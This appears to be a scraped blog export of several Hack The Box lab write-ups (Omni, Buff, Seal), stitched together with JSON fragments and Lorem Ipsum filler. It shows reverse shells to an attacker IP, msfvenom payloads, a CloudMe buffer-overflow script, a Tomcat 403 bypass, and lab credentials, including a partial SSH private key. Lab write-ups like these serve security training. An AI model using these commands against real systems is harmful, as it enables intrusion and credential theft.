(GB)\nProvider\nRoot\n\n\n\n\nAlias\n\n\nAlias\n\n\n\nC\n1.04\n0.54\nFileSystem\nC:\\\n\n\nCert\n\n\nCertificate\n\\\n\n\nD\n\n\nFileSystem\nD:\\\n\n\nEnv\n\n\nEnvironment\n\n\n\nFunction\n\n\nFunction\n\n\n\nHKCU\n\n\nRegistry\nHKEY_CURRENT_USER\n\n\nHKLM\n\n\nRegistry\nHKEY_LOCAL_MACHINE\n\n\nU\n0.51\n4.37\nFileSystem\nU:\\\n\n\nVariable\n\n\nVariable\n\n\n\nWSMan\n\n\nWSMan\n\n\n\n\nWith further enumeration we find Users-directories in both C:and U:- however none contain any relevant information. I got stuck here for a good while and started to look back on previous boxes, and found that on the box Resolute (also created by egre55) there was a hidden file containing valuable data.\nSo I started to look in every directory for hidden files, and voiala!\nPS C:Files&gt; get-childitem -Path [rs]* -Force get-childitem -Path [rs]* -Force\nDirectory: C:Files\n\n\n\nMode\nLastWriteTime\nLength\nName\n\n\n\n\n-a-h– 8/21/2\n020 12:56 PM\n247\nr.bat\n\n\n\nPS C:Files&gt; type r.bat type r.bat @echo off\n:LOOP\nfor /F “skip=6” %%i in (‘net localgroup “administrators”’) do net localgroup “administrators” %%i /delete\nnet user app mesh5143 net user administrator _1nt3rn37ofTh1nGz\nping -n 3 127.0.0.1\ncls\nGOTO :LOOP\n:EXIT\nChange user from DefaultAccount to Administrator and look for user- and root.txt.\n\nPS C:&gt; $env:UserName DefaultAccount PS C:&gt; $env:computername omni PS C:&gt; $user = ‘omni’ PS C:&gt; $pass = ’_1nt3rn37ofTh1nGz’ | ConvertTo-SecureString -AsPlainText -Force PS C:&gt; \\(creds = New-Object System.Management.Automation.PSCredential(\\)user,$pass) PS C:&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { $env:UserName } Administrator PS C:Files&gt; Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell }\nroot@nidus:/git/htb/omni# rlwrap nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49679 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:\\Data\\Users\\administrator\\Documents&gt; $env:UserName\n  Administrator\nLooking for root.txt we can see that it’s some how encrypted, same goes with user.txt.\nPS C:&gt; type root.txt    System.Management.Automation.PSCredential System.Object  System.Management.Automation.PSCredential  flag 01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7   \nPS C:&gt; type user.txt    System.Management.Automation.PSCredential System.Object  System.Management.Automation.PSCredential  flag 01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7   \nLooking for ways to decrypt this is googled ‘powershell password decrypt’ and found a Microsoft Devblog covering the subject. However following the blog post trying to decrypt the files doesn’t work. Both root- and user.txt gives the same error: “Import-CliXml : Error occurred during a cryptographic operation.”\nPS C:&gt; $Credz = Import-CliXml -Path C:.txt $Credz = Import-CliXml -Path C:.txt Import-CliXml : Error occurred during a cryptographic operation. At line:1 char:10 + $Credz = Import-CliXml -Path C:.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Import-Clixml], Cryptographic Exception + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept ion,Microsoft.PowerShell.Commands.ImportClixmlCommand\nPS C:&gt; $Credz = Import-CliXml -Path C:.txt $Credz = Import-CliXml -Path C:.txt Import-CliXml : Error occurred during a cryptographic operation. At line:1 char:10 + $Credz = Import-CliXml -Path C:.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Import-Clixml], Cryptographic Exception + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept ion,Microsoft.PowerShell.Commands.ImportClixmlCommand\nGoogling about this it tells that the issue is because of missing machine key in web.config, exact quote: “For anyone who hasn’t solved their problem, I was missing the”machineKey” entry for encrypt/decrypt in my web.config”\n\nSo web.config, lets try to approach this from the webb app on port 8080, login with app:mesh5143. Press ‘Processes’ &gt; ‘Run Command’ and get a reverse shell from your local SMB-share: //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell\nroot@nidus:/git/htb/omni# rlwrap nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49705 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt; $env:UserName app PS C:&gt; $Credz = Import-CliXml -Path C:.txt PS C:&gt; $Credz.GetNetworkCredential().Password 7cfd50f6bc34db3204898f1505ad9d70\nFinally, we got user.txt.\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nAs we already have the credentials for Administrator, login again on port 8080 (administrator:_1nt3rn37ofTh1nGz) and repeat the process to grab root.txt.\nPress ‘Processes’ &gt; ‘Run Command’ and get a reverse shell from your local SMB-share: //10.10.14.4/pub-share/nc64.exe 10.10.14.4 4499 -e powershell\n\nroot@nidus:/git/htb/omni# rlwrap nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.204] 49705 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:\\windows\\system32&gt; $env:UserName\n  Administrator\nPS C:\\windows\\system32&gt; $Credz = Import-CliXml -Path C:\\Data\\Users\\administrator\\root.txt\nPS C:\\windows\\system32&gt; $Credz.GetNetworkCredential().Password\n  5dbdce5569e2c4708617c0ce6e9bf11d\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nIn-Depth of IoT Core https://www.blackhat.com/docs/us-16/materials/us-16-Sabanal-Into-The-Core-In-Depth-Exploration-Of-Windows-10-IoT-Core-wp.pdf\nExploit IoT Core https://www.zdnet.com/article/new-exploit-lets-attackers-take-control-of-windows-iot-core-devices/\nSirepRAT https://github.com/SafeBreach-Labs/SirepRAT\nDecrypt PowerShell https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/\nDecrypt Error: https://stackoverflow.com/questions/25857577/error-occurred-during-a-cryptographic-operation-when-decrypting-forms-cookie"
  },
  {
    "objectID": "posts/2020-07-27-htb-writeup-buff/2020-07-27-htb-writeup-buff.html",
    "href": "posts/2020-07-27-htb-writeup-buff/2020-07-27-htb-writeup-buff.html",
    "title": "Buff - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nroot@nidus:~# nmap -Pn -sC -sV -n 10.10.10.198 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-27 08:52 CEST Nmap scan report for 10.10.10.198 Host is up (0.027s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 8080/tcp open http Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION |_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 |_http-title: mrb3n’s Bro Hut\nBrowsing the webpage under Contact we find the information “Made using Gym Management Software 1.0”. A quick google for exploits the first result that comes up is an unauthenticated RCE. Download and run the python script:\nroot@nidus:/git/htb/buff# python rce.py http://10.10.10.198:8080/ /\n/vvvvvvvvvvvv -————————————-, `^^^^^^^^^^^^ /============BOKU=====================” /\n[+] Successfully connected to webshell. C:&gt; whoami �PNG � buff\nThe shell is basic and we are unable to traverse the directories. Upload nc.exe and use it to get a workable shell.\nFrom my browser: http://10.10.10.198:8080/upload/kamehameha.php?telepathy=curl -O 10.10.14.4:8888/nc.exe\nC:&gt; nc.exe 10.10.14.4 4488 -e powershell\nroot@nidus:~# rlwrap nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.198] 50355 Windows PowerShell Copyright (C) Microsoft Corporation. All rights reserved.\nPS C:&gt;\nTraversing to the gym directory we find “New Text Document.txt” containing database information. Possible rabbit hole?\nPS C:&gt; type “New Text Document.txt” type “New Text Document.txt” $mysql_host = “mysql16.000webhost.com”; $mysql_database = “a8743500_secure”; $mysql_user = “a8743500_secure”; $mysql_password = “ipad12345”;\nGo and grab user.txt PS C:&gt; cat user.txt cat user.txt 1a2e0b6779aa060fc44a5575a0a88926\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██████╗ ██████╗ ██████╗ ████████╗ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝ ██████╔╝██║ ██║██║ ██║ ██║ ██╔══██╗██║ ██║██║ ██║ ██║ ██║ ██║╚██████╔╝╚██████╔╝ ██║ ╚═╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝\n\nEnumerate the box using winPEAS gives us nothing of use. Browsing the directories of shaun we find the file CloudMe_1112.exe, a quick google on that file shows us that it’s vulnerable to buffer overflow. CloudMe runs on port 8888 and can be verified by executing the .exe-file and then run netstat. C:&gt;netstat -ano netstat -ano\nActive Connections Proto Local Address Foreign Address State PID TCP 127.0.0.1:8888 0.0.0.0:0 LISTENING 1472\nPrepare the exploit and create the payload reverse shell. Save the binary data (buf-lines) is your payload. root@nidus:/git/htb/buff# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4499 EXITFUNC=thread -b “0d0a” -f python [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of python file: 1712 bytes buf = b”” buf += b”2e4a5e” buf += b”4d” buf += b”2d” buf += b”4f5b9d” buf += b”6d4c” buf += b”2a5a7a4a” buf += b”0c” buf += b”0f9c1b” buf += b”5c3d3d” buf += b”1a3f1e6e” buf += b”8e” buf += b”8b9f” buf += b”5c” buf += b”” buf += b”4f8d6b” buf += b”6a3b9c6a5d” buf += b”8b2c2b” buf += b”8c3b5a” buf += b”2f” buf += b”6c2c3b9a” buf += b”1a8e” buf += b”3c0f8b” buf += b”5f6a” buf += b”8d” buf += b”8d8d6f” buf += b”0b2a4a6c” buf += b”8e9f9f”\nModify the exploit script and change the payload to your reverse shell.\nroot@nidus:/git/htb/buff# cat root-exploit.py import socket\ntarget = “127.0.0.1”\npadding1 = b”” * 1052 EIP = b”” # 0x68A842B5 -&gt; PUSH ESP, RET NOPS = b”” * 30\n#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4499 EXITFUNC=thread -b “0d0a” -f python payload = b”” payload += b”2c9a5f” payload += b”5b” payload += b”5f0b9f6c7a” payload += b”0f1c3c5d9a7a” payload += b”9b1a0c” payload += b”9b3c8c1f” payload += b”” payload += b”0c9b2a” payload += b”” payload += b”6b6f4c4b6c” payload += b”5f” payload += b”1b7e” payload += b”0f5b” payload += b”5e” payload += b”4e” payload += b”6d8e” payload += b”6a5c9a” payload += b”8b6b7f3d” payload += b”8a3c” payload += b”0b3e7a2e” payload += b”5d4f1a” payload += b”3f1a1c7b” payload += b”8c7a8d2d7f” payload += b”0f” payload += b”8a2b” payload += b”4e2a9f” payload += b”2d5c”\noverrun = b”C” * (1500 - len(padding1 + NOPS + EIP + payload))\nbuf = padding1 + EIP + NOPS + payload + overrun\ntry: s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((target,8888)) s.send(buf) except Exception as e: print(sys.exc_value)\nThe script needs to be executed on the local box, as the victim doesn’t have python installed. Create a reverse port forward using plink.\nUpload plink: PS C:&gt; invoke-webrequest -uri “http://10.10.14.4:8877/plink.exe” -outfile “C:.exe”\nSetup the reverse port forward using the following syntax: ./plink.exe  :127.0.0.1:\nPS C:&gt; ./plink.exe 10.10.14.4 -R 8888:127.0.0.1:8888 ./plink.exe 10.10.14.4 -R 8888:127.0.0.1:8888 The server’s host key is not cached in the registry. You have no guarantee that the server is the computer you think it is. The server’s ssh-ed25519 key fingerprint is: ssh-ed25519 255 6a:d5:96:27:f9:c4:a0:c4:49:86:6d:2d:0e:76:7f:81 If you trust this host, enter “y” to add the key to PuTTY’s cache and carry on connecting. If you want to carry on connecting just once, without adding the key to the cache, enter “n”. If you do not trust this host, press Return to abandon the connection. Store key in cache? (y/n) y login as: p3 p3@10.10.14.4’s password: ********\nSetup a new listener to capture the reverse shell from the exploit, and then execute the script. Grab root.txt\nroot@nidus:/git/htb/buff# python root-exploit.py root@nidus:~# rlwrap nc -lvnp 4499 listening on [any] 4499 … connect to [10.10.14.4] from (UNKNOWN) [10.10.10.198] 49709 Microsoft Windows [Version 10.0.17134.1610]\n\n2018 Microsoft Corporation. All rights reserved.\n\nC:&gt;whoami whoami buff\nC:&gt;cd C: cd C:\nC:&gt;type root.txt type root.txt d19eb6d412b70730c11484d0e0076c3b\n\n██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████\n██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝\nGym Management Software 1.0 RCE: https://www.exploit-db.com/exploits/48506\nCloudMe_1112 Buffer Overflow: https://www.exploit-db.com/exploits/48389"
  },
  {
    "objectID": "posts/2021-08-24-htb-writeup-seal/2021-08-24-htb-writeup-seal.html",
    "href": "posts/2021-08-24-htb-writeup-seal/2021-08-24-htb-writeup-seal.html",
    "title": "Seal - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\n[root:/git/htb/seal]# nmap -Pn -n -sCV 10.10.10.250 –open (master✱) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4b:89:47:39:67:3d:07:31:5e:3f:4c:27:41:1f:f9:67 (RSA) | 256 04:a7:4f:39:95:65:c5:b0:8d:d5:49:2e:d8:44:00:36 (ECDSA) |_ 256 b4:5e:83:93:c5:42:49:de:71:25:92:71:23:b1:85:54 (ED25519) 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |http-title: Seal Market | ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK | Not valid before: 2021-05-05T10:24:03 |Not valid after: 2022-05-05T10:24:03 | tls-alpn: | http/1.1 | tls-nextprotoneg: | http/1.1 8080/tcp open http-proxy | fingerprint-strings: | FourOhFourRequest: | HTTP/1.1 401 Unauthorized | Date: Fri, 20 Aug 2021 18:18:58 GMT | Set-Cookie: JSESSIONID=node0ckxzfrsamy141gl0hvem8jus82.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | GetRequest: | HTTP/1.1 401 Unauthorized | Date: Fri, 20 Aug 2021 18:18:58 GMT | Set-Cookie: JSESSIONID=node09ex2b4ulw72vng49957ovldj0.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Content-Length: 0 | HTTPOptions: | HTTP/1.1 200 OK | Date: Fri, 20 Aug 2021 18:18:58 GMT | Set-Cookie: JSESSIONID=node0rgfkubarz67yocnkxyr80we01.node0; Path=/; HttpOnly | Expires: Thu, 01 Jan 1970 00:00:00 GMT | Content-Type: text/html;charset=utf-8 | Allow: GET,HEAD,POST,OPTIONS | Content-Length: 0 | RPCCheck: | HTTP/1.1 400 Illegal character OTEXT=0x80 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 71 | Connection: close |\n\nBad Message 400\n\nreason: Illegal character OTEXT=0x80\n| RTSPRequest: | HTTP/1.1 505 Unknown Version | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 58 | Connection: close |\n\nBad Message 505\n\nreason: Unknown Version\n| Socks4: | HTTP/1.1 400 Illegal character CNTL=0x4 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |\n\nBad Message 400\n\nreason: Illegal character CNTL=0x4\n| Socks5: | HTTP/1.1 400 Illegal character CNTL=0x5 | Content-Type: text/html;charset=iso-8859-1 | Content-Length: 69 | Connection: close |_\n\nBad Message 400\n\nreason: Illegal character CNTL=0x5\n| http-auth: | HTTP/1.1 401 Unauthorized0D |_ Server returned status 401 but no WWW-Authenticate header. |_http-title: Site doesn’t have a title (text/html;charset=utf-8).\n\nDIRB: ==&gt; DIRECTORY: https://10.10.10.250/admin/ ==&gt; DIRECTORY: https://10.10.10.250/css/ ==&gt; DIRECTORY: https://10.10.10.250/host-manager/ ==&gt; DIRECTORY: https://10.10.10.250/icon/ ==&gt; DIRECTORY: https://10.10.10.250/images/ + https://10.10.10.250/index.html (CODE:200|SIZE:19737) ==&gt; DIRECTORY: https://10.10.10.250/js/ ==&gt; DIRECTORY: https://10.10.10.250/manager/\nNIKTO: + SSL Info: Subject: /C=UK/ST=London/L=Hackney/O=Seal Pvt Ltd/OU=Infra/CN=seal.htb/emailAddress=admin@seal.htb\n\nDomain name: seal.htb\nEmail: admin@seal.htb\n\n\nVisit http://seal.htb:8080 and create a new account. Looking around at issues, we find 2 users;\n\n\nluis (luis@seal.htb) Core Dev\nalex (alex@seal.htb) Infra Admin\n\nLooking at recent changes, we find http://seal.htb:8080/root/seal_market/commit/971f3aa3f0a0cc8aac12fd696d9631ca540f44c7, and within they remove this line: \nTrying to login on SSH with all found users (admin, luis, alex) and password ’42MrHBf*z8{Z%’ fails. Trying on port 8080 we get access as user Luis. Compared to our own created user, we now have a Settings tab in the seal_markt nav bar. Looking around there’s not anything obvious we can do. However looking on the initial todo we get a hint about tomcat and the mutual authentication.\n\nToDo Remove mutual authentication for dashboard, setup registration and login features. Deploy updated tomcat configuration. Disable manager and host-manager.\n\nSo take a step back and go to ‘https://10.10.10.250/manager/status’ and we are presented with a login prompt. Use the found creds tomcat:42MrHBf*z8{Z%\nWe find that Tomcat is running on version: Apache Tomcat/9.0.31 (Ubuntu). This page doesn’t give us much, but we still get error 403 Forbidden when trying to reach https://seal.htb/manager/html. We want to reach this point as this is where we would be able to upload malicious .war files.\nGoogling around for 403 Bypass we come across a lot of different scripts, one called Byp4xx.\n[root:/git/htb/seal/byp4xx]# ./byp4xx.py https://seal.htb/manager/html [+]#BUGBOUNTYTIPS .. Between /.;/: HTTP/1.1 401 Between ;foo=bar;/: HTTP/1.1 401\nExecuting the script we see two 401 Errors. &gt; The HTTP 401 Unauthorized client error status response code indicates that the request has &gt; not been applied because it lacks valid authentication credentials for the target resource\nIf we try to visit https://10.10.10.250/manager/.;/html we are now presented with the Application Manager!\n\nCreate a .war reverse shell.\n\n[root:/git/htb/seal]# msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.2 lport=4488 -f war &gt; rev.war (master✱) Payload size: 1100 bytes Final size of war file: 1100 bytes\nUpload it using the GUI, but before deploying enable the burp proxy to capture the POST request. In the request add the between (.;) symbols to bypass the 403 and the file should upload successfully.\nSetup a listener and visit https://seal.htb/rev to get your shell.\n[root:/opt]# nc -lvnp 4488 listening on [any] 4488 … connect to [10.10.14.2] from (UNKNOWN) [10.10.10.250] 48564 id && hostname uid=997(tomcat) gid=997(tomcat) groups=997(tomcat) seal python3 -c ‘import pty;pty.spawn(“/bin/bash”)’; tomcat@seal:/var/lib/tomcat9$\n\nWe are unable to (easily) upload linpeas to the machine, however we quickly find a backup script that’s ran by user luis every minute.\n\ncat /opt/backups/playbook/run.yml - hosts: localhost tasks: - name: Copy Files synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes - name: Server Backups archive: path: /opt/backups/files/ dest: “/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz” - name: Clean file: state: absent path: /opt/backups/files/\nFrom the script/program, we see that dashboard and everything within are backed up to /opt/backups/archive. At the end of the line they say “copy_links=yes”, digging a bit deeper in to this I found: &gt; “Copy symlinks as the item that they point to (the referent) is copied, rather than the symlink.”\nMeaning if we can create a symlink in /var/lib/tomcat9/webapps/ROOT/admin/dashboard/, the content of the symlink will be backed up.\n/var/lib/tomcat9/webapps/ROOT/admin/dashboard/: total 100 drwxr-xr-x 7 root root 4096 May 7 09:26 . drwxr-xr-x 3 root root 4096 May 6 10:48 .. drwxr-xr-x 5 root root 4096 Mar 7 2015 bootstrap drwxr-xr-x 2 root root 4096 Mar 7 2015 css drwxr-xr-x 4 root root 4096 Mar 7 2015 images -rw-r–r– 1 root root 71744 May 6 10:42 index.html drwxr-xr-x 4 root root 4096 Mar 7 2015 scripts drwxrwxrwx 2 root root 4096 Aug 25 14:16 uploads\nQuickly we see that the ‘uploads’ directory is writable, we can create a symlink and then grab the content.\ntomcat@seal:/opt/backups/archives$ ln -d -s /home/luis/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/luis-pls\nWe can see that one of the files is much bigger, this is because it also contains /home/luis. tomcat@seal:/opt/backups/archives$ ls -al total 114704 drwxrwxr-x 2 luis luis 4096 Aug 25 14:38 . drwxr-xr-x 4 luis luis 4096 Aug 25 14:38 .. -rw-rw-r– 1 luis luis 115628384 Aug 25 14:35 backup-2021-08-25-14:35:32.gz -rw-rw-r– 1 luis luis 606058 Aug 25 14:36 backup-2021-08-25-14:36:32.gz\nExamine the file using zcat / zgrep. My way was absolutely not the best way, as all data printed out and I had to go through many many rows before I found the id_rsa file.\ntomcat@seal:/opt/backups/archives$ zcat -f backup-2021-08-25-14:35:32.gz .. dashboard/uploads/luis-pls/.ssh/id_rsa0000600000175000017500000000503600000000000020232 0ustar00luisluis00000000000000—–BEGIN OPENSSH PRIVATE KEY—– b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAs3kISCeddKacCQhVcpTTVcLxM9q2iQKzi9hsnlEt0Z7kchZrSZsG DkID79g/4XrnoKXm2ud0gmZxdVJUAQ33Kg3Nk6czDI0wevr/YfBpCkXm5rsnfo5zjEuVGo MTJhNZ8iOu7sCDZZA6sX48OFtuF6zuUgFqzHrdHrR4+YFawgP8OgJ9NWkapmmtkkxcEbF4 n1+v/l+74kEmti7jTiTSQgPr/ToTdvQtw12+YafVtEkB/8ipEnAIoD/B6JOOd4pPTNgX8R MPWH93mStrqblnMOWJto9YpLxhM43v9I6EUje8gp/EcSrvHDBezEEMzZS+IbcP+hnw5ela duLmtdTSMPTCWkpI9hXHNU9njcD+TRR/A90VHqdqLlaJkgC9zpRXB2096DVxFYdOLcjgeN 3rcnCAEhQ75VsEHXE/NHgO8zjD2o3cnAOzsMyQrqNXtPa+qHjVDch/T1TjSlCWxAFHy/OI PxBupE/kbEoy1+dJHuR+gEp6yMlfqFyEVhUbDqyhAAAFgOAxrtXgMa7VAAAAB3NzaC1yc2 EAAAGBALN5CEgnnXSmnAkIVXKU01XC8TPatokCs4vYbJ5RLdGe5HIWa0mbBg5CA+/YP+F6 56Cl5trndIJmcXVSVAEN9yoNzZOnMwyNMHr6/2HwaQpF5ua7J36Oc4xLlRqDEyYTWfIjru 7Ag2WQOrF+PDhbbhes7lIBasx63R60ePmBWsID/DoCfTVpGqZprZJMXBGxeJ9fr/5fu+JB JrYu404k0kID6/06E3b0LcNdvmGn1bRJAf/IqRJwCKA/weiTjneKT0zYF/ETD1h/d5kra6 m5ZzDlibaPWKS8YTON7/SOhFI3vIKfxHEq7xwwXsxBDM2UviG3D/oZ8OXpWnbi5rXU0jD0 wlpKSPYVxzVPZ43A/k0UfwPdFR6nai5WiZIAvc6UVwdtPeg1cRWHTi3I4Hjd63JwgBIUO+ VbBB1xPzR4DvM4w9qN3JwDs7DMkK6jV7T2vqh41Q3If09U40pQlsQBR8vziD8QbqRP5GxK MtfnSR7kfoBKesjJX6hchFYVGw6soQAAAAMBAAEAAAGAJuAsvxR1svL0EbDQcYVzUbxsaw MRTxRauAwlWxXSivmUGnJowwTlhukd2TJKhBkPW2kUXI6OWkC+it9Oevv/cgiTY0xwbmOX AMylzR06Y5NItOoNYAiTVux4W8nQuAqxDRZVqjnhPHrFe/UQLlT/v/khlnngHHLwutn06n bupeAfHqGzZYJi13FEu8/2kY6TxlH/2WX7WMMsE4KMkjy/nrUixTNzS+0QjKUdvCGS1P6L hFB+7xN9itjEtBBiZ9p5feXwBn6aqIgSFyQJlU4e2CUFUd5PrkiHLf8mXjJJGMHbHne2ru p0OXVqjxAW3qifK3UEp0bCInJS7UJ7tR9VI52QzQ/RfGJ+CshtqBeEioaLfPi9CxZ6LN4S 1zriasJdAzB3Hbu4NVVOc/xkH9mTJQ3kf5RGScCYablLjUCOq05aPVqhaW6tyDaf8ob85q /s+CYaOrbi1YhxhOM8o5MvNzsrS8eIk1hTOf0msKEJ5mWo+RfhhCj9FTFSqyK79hQBAAAA 